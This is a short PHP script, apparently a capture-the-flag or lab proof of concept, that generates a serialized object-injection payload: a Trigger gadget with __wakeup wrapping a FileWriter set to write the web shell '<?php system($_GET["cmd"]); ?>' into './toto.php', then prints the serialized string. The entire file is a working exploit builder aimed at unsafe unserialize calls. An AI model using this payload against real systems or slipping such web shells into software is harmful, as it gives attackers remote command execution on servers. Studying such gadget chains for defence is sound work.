<?php 

class FileWriter {
    public $file;
    public $payload;
    function write() {
        
    }
}

class Trigger { public $obj; function __wakeup(){} }


$a = new FileWriter();
$a->file = "./toto.php";
$a->payload = '<?php system($_GET["cmd"]); ?>';

$b= new Trigger();
$b->obj = $a;


echo serialize($b);

?>
